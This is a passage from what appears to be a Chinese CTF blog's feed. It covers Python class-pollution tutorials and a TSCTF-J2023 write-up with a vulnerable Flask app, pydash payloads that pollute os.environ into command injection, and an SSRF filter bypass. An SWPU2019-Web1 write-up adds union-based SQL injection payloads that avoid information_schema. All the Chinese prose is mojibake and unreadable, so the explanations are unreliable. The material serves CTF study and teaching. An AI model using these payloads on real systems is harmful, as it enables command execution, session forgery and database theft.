title="__kwdefaults__"></a><code>__kwdefaults__</code></h3><blockquote><p><code>__kwdefaults__</code>ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼, å³å£°æ˜åœ¨* åçš„å‚æ•°é»˜è®¤å€¼çš„é”®å€¼å¯¹ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š</p></blockquote><p>ç¤ºä¾‹payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡os-environä¿®æ”¹ç¯å¢ƒå˜é‡"><a href="#é€šè¿‡os-environä¿®æ”¹ç¯å¢ƒå˜é‡" class="headerlink" title="é€šè¿‡os.environä¿®æ”¹ç¯å¢ƒå˜é‡"></a>é€šè¿‡os.environä¿®æ”¹ç¯å¢ƒå˜é‡</h2><p>é€šè¿‡æ±¡æŸ“os.environæ¥ä¿®æ”¹ç¯å¢ƒå˜é‡LD_PROLOADä¸ä¸Šä¼ .soåŠ«æŒç­‰æ‰©å±•æ”»å‡»é¢</p><p>è¿™é‡Œçœ‹è§äº†ä¸€ä¸ªä¾‹å­ é€šè¿‡os.environå¯¼è‡´å‘½ä»¤æ³¨å…¥:</p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.__class__.__init__.__globals__[<span class="string">&#x27;subprocess&#x27;</span>].os.environ.__setitem__(<span class="string">&#x27;COMSPEC&#x27;</span>, <span class="string">&quot;cmd /c calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash"><a href="#åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash" class="headerlink" title="åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash"></a>åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash</h2><blockquote><p>Pydashçš„set_()å’Œset_with()å‡½æ•°æ˜¯é€’å½’åˆå¹¶å‡½æ•°çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ±¡æŸ“å±æ€§ã€‚</p><p>Pydash å‡½æ•°ä½¿ç”¨ç‚¹ç¬¦å·è®¿é—®å±æ€§å’Œé¡¹ç›®è€Œä¸æ˜¯ JSON æ ¼å¼</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotAccessibleClass</span>: <span class="keyword">pass</span></span><br><span class="line">not_accessible_variable = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.not_accessible_variable&#x27;</span>,<span class="string">&#x27;Polluted variable&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(not_accessible_variable)</span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.NotAccessibleClass.__qualname__&#x27;</span>,<span class="string">&#x27;PollutedClass&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(NotAccessibleClass)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&gt; Polluted variable</span></span><br><span class="line"><span class="comment">#&gt; &lt;class &#x27;__main__.PollutedClass&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="flaskç›¸å…³"><a href="#flaskç›¸å…³" class="headerlink" title="flaskç›¸å…³"></a>flaskç›¸å…³</h2><h3 id="secret-keyæ±¡æŸ“"><a href="#secret-keyæ±¡æŸ“" class="headerlink" title="secret_keyæ±¡æŸ“"></a>secret_keyæ±¡æŸ“</h3><p>ä¹‹å‰åœ¨å®¢æˆ·ç«¯sessionçš„é—®é¢˜ä¸­æ¥è§¦è¿‡å¯¹flask sessionçš„ä¼ªé€ , secret_keyå°±æ˜¯ä¸€ä¸ªå¿…è¦çš„æ¡ä»¶</p><p>å¯ä»¥é€šè¿‡è¦†ç›–åŸæœ‰çš„secret_keyå®ç°ä»»æ„sessionä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><h3 id="TSCTF-J2023-Python-Not-Node"><a href="#TSCTF-J2023-Python-Not-Node" class="headerlink" title="TSCTF-J2023 Python Not Node"></a>TSCTF-J2023 Python Not Node</h3><p>æ‰¾ä¸åˆ°å“ªä¸ªé¶åœºæœ‰è¿™é¢˜, ç®€å•çœ‹ä¸€ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">os.environ[<span class="string">&#x27;cmd&#x27;</span>] = <span class="string">&quot;ping -c 10 www.baidu.com&quot;</span> </span><br><span class="line">black_list = [<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Userinfo</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/define&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">define</span>():</span><br><span class="line">   <span class="keyword">if</span> request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(request.args)</span><br><span class="line">           usname = request.args[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">           info = request.args[<span class="string">&#x27;info&#x27;</span>]</span><br><span class="line">           origin_user = request.args[<span class="string">&#x27;origin_user&#x27;</span>]</span><br><span class="line">           user = &#123;usname: info&#125;</span><br><span class="line">           <span class="built_in">print</span>(<span class="built_in">type</span>(user))</span><br><span class="line">           pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;) </span><br><span class="line">           result = comexec().test_ping()</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;USER READY,JUST INSERT YOUR SEARCH RESULT&quot;</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;NOPE&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">       urls = request.args[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">           <span class="keyword">if</span> i <span class="keyword">in</span> urls:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;HACKER URL!&quot;</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           info = urllib.request.urlopen(urls).read().decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">           <span class="keyword">return</span> info</span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(e)</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;error&quot;</span> </span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Method error&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt; Welcome to this Challenge &lt;/html&gt; &lt;script&gt;alert(&#x27;focus on the </span></span><br><span class="line"><span class="string">source code&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app.run(debug=<span class="literal">True</span>, port=<span class="number">37333</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªflaskå®ç°çš„ç¨‹åº</p><p>å…¶ä¸­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;)</span><br><span class="line">result = comexec().test_ping()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†pydashå¹¶ä¸”ä¹‹åæ‰§è¡Œäº†ç¯å¢ƒå˜é‡ä¸­cmdå­˜å‚¨çš„pingå‘½ä»¤</p><p>å› æ­¤å°±å¯ä»¥é€šè¿‡pydashæ¥æ±¡æŸ“ç¯å¢ƒå˜é‡ åˆ°è¾¾å‘½ä»¤æ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_user=__class__.__init__.__globals__.os.environ&amp;info=Polluted</span><br></pre></td></tr></table></figure><p>è‡³äºè¿™é‡Œçš„ssrf, æ¬è¿ä¸€ä¸‹å¤§ä½¬çš„è¯</p><blockquote><ul><li><p><strong>SSRF</strong></p><ul><li><p>å¸¸è§çš„æ–¹å¼æ˜¯8è¿›åˆ¶ã€16è¿›åˆ¶ã€302è·³è½¬ç­‰ç»•è¿‡ï¼Œè¿™äº›éƒ½è¢«å±è”½äº†ï¼Œæœ€åé¢˜è§£è¯´æ˜¯ç®€å•çš„å¤§å°å†™ç»•è¿‡ã€‚</p><p>ä½†æ˜¯åšé¢˜çš„æ—¶å€™æ²¡æƒ³åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ˜¯<strong>localtest.me</strong>åŸŸåç»•è¿‡ï¼Œè¿™æ˜¯å¤§ä½¬ä¹°ä¸‹çš„åŸŸåï¼Œè®¿é—®æ—¶å…¶å®æ˜¯é‡å®šå‘åˆ°æœ¬æœºï¼Œè¿™æ ·çš„åŸŸåè¿˜æœ‰å¾ˆå¤šã€‚</p></li><li><p>è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯éœ€è¦urlç¼–ç é¿å…å‚æ•°çš„æ··æ·†è§£æï¼Œå› ä¸ºè¿™é‡ŒSSRFçš„åŸŸåä¹Ÿéœ€è¦æ·»åŠ å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œurlç¼–ç ã€‚</p></li></ul></li></ul></blockquote><p>å‚è€ƒ:</p><p><a href="https://xz.aliyun.com/t/13072">https://xz.aliyun.com/t/13072</a></p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“&quot;&gt;&lt;a href=&quot;#Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“&quot; class=&quot;headerlink&quot; title=&quot;Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)&quot;&gt;&lt;/a&gt;Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)&lt;/h1&gt;&lt;p&gt;ä¸JavaScriptåŸå‹é“¾æ±¡æŸ“</summary>
      
    
    
    
    
    <category term="PythonåŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)" scheme="http://example.com/tags/Python%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web1</title>
    <link href="http://example.com/2024/02/26/SWPU2019-Web1/"/>
    <id>http://example.com/2024/02/26/SWPU2019-Web1/</id>
    <published>2024-02-26T13:38:46.000Z</published>
    <updated>2024-02-26T15:47:54.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019-Web1"></a>SWPU2019-Web1</h1><p>åœ¨æ³¨å†Œç™»å½•åå¹¿å‘Šç”³è¯·å¤„ å¹¿å‘Šåå­—æ®µå­˜åœ¨æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214413930.png" alt="image-20240226214413930"></p><p>ç¦äº†or, å¯ä»¥ä½¿ç”¨group byæµ‹è¯•å‡ºæŸ¥è¯¢å­—æ®µæ•°</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214507781.png" alt="image-20240226214507781"></p><p>è¿™é‡Œçš„éš¾ç‚¹åœ¨äºç¦äº†information_schema</p><p>å…³äºæ— è¡¨å,åˆ—åæ³¨å…¥:</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p><p>è¿™é‡Œä½¿ç”¨<strong>innodb_table_stats</strong>è¿™å¼ è¡¨æ¥å‘ç°è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,group_concat(table_name),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1&#x27;=&#x27;1&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226220242765.png" alt="image-20240226220242765"></p><p>ä¹‹åæ˜¯æ— åˆ—åæ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)from(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226225432773.png" alt="image-20240226225432773"></p><p><strong>æ€»ç»“</strong></p><h2 id="mysqlç»•è¿‡information-schema-æ— è¡¨ååˆ—åæ³¨å…¥"><a href="#mysqlç»•è¿‡information-schema-æ— è¡¨ååˆ—åæ³¨å…¥" class="headerlink" title="mysqlç»•è¿‡information_schema, æ— è¡¨ååˆ—åæ³¨å…¥"></a>mysqlç»•è¿‡information_schema, æ— è¡¨ååˆ—åæ³¨å…¥</h2><h3 id="æ— è¡¨å"><a href="#æ— è¡¨å" class="headerlink" title="æ— è¡¨å:"></a>æ— è¡¨å:</h3><h4 id="InnoDBå¼•æ“"><a href="#InnoDBå¼•æ“" class="headerlink" title="InnoDBå¼•æ“"></a>InnoDBå¼•æ“</h4><blockquote><p>ä»MySQL 5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MySQL  5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼ŒInnoDbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(database_name) <span class="keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><h4 id="sysåº“"><a href="#sysåº“" class="headerlink" title="sysåº“"></a>sysåº“</h4><blockquote><p>åœ¨MySQL 5.7ä¸­ï¼Œæ–°å¢äº†sysç³»ç»Ÿæ•°æ®åº“ï¼Œé€šè¿‡è¿™ä¸ªåº“å¯ä»¥å¿«é€Ÿåœ°äº†è§£ç³»ç»Ÿçš„å…ƒæ•°æ®ä¿¡æ¯ã€‚sysåº“æ˜¯é€šè¿‡è§†å›¾çš„å½¢å¼æŠŠinformation_schemaå’Œperformance_schemaç»“åˆèµ·æ¥ï¼ŒæŸ¥è¯¢å‡ºæ›´åŠ ä»¤äººå®¹æ˜“ç†è§£çš„æ•°æ®ã€‚</p></blockquote><h5 id="sys-schema-auto-increment-columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨"><a href="#sys-schema-auto-increment-columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨" class="headerlink" title="sys.schema_auto_increment_columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨"></a>sys.schema_auto_increment_columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="x-schema-table-statistics-with-buffer"><a href="#x-schema-table-statistics-with-buffer" class="headerlink" title="x$schema_table_statistics_with_buffer"></a>x$schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—å"><a href="#æ— åˆ—å" class="headerlink" title="æ— åˆ—å"></a>æ— åˆ—å</h3><h4 id="å­æŸ¥è¯¢"><a href="#å­æŸ¥è¯¢" class="headerlink" title="å­æŸ¥è¯¢"></a>å­æŸ¥è¯¢</h4><p>åŸç†: å°†è¦æŸ¥è¯¢çš„è¡¨ä¸­çš„å†…å®¹å¯¼å…¥åˆ°é›¶æ—¶è¡¨ä¸­, å†ä»é›¶æ—¶è¡¨ä¸­é€šè¿‡è‡ªå®šä¹‰çš„åˆ—åæ¥æŸ¥è¯¢å‡ºæ•°æ®</p><p>ç¤ºä¾‹:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">100</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å‡è®¾æ­¤æ—¶è¦æŸ¥è¯¢æ‰€æœ‰çš„username, å°±å¯ä»¥å¯¹ç¬¬äºŒä¸ªæŸ¥è¯¢çš„å­—æ®µè¿›è¡Œå­æŸ¥è¯¢å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232242851.png" alt="image-20240226232242851"></p><p>è¿™é‡Œunionåé¢ä¸€å…±æŸ¥è¯¢äº†ä¸‰æ¬¡:</p><p><strong>ç¬¬ä¸€æ¬¡</strong></p><p>ä¹Ÿå°±æ˜¯æœ€å†…å±‚çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232548082.png" alt="image-20240226232548082"></p><p><strong>ç¬¬äºŒæ¬¡</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure><p>å°†ç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ°çš„è¡¨ä¸­<code>2</code>å­—æ®µçš„å†…å®¹(ä¹Ÿå°±æ˜¯åŸusersè¡¨ä¸­usernameçš„å†…å®¹)æŸ¥å‡ºæ¥å†ç”Ÿæˆä¸€å¼ é›¶æ—¶è¡¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232717346.png" alt="image-20240226232717346"></p><p><strong>ç¬¬ä¸‰æ¬¡</strong></p><p>åˆå¹¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span 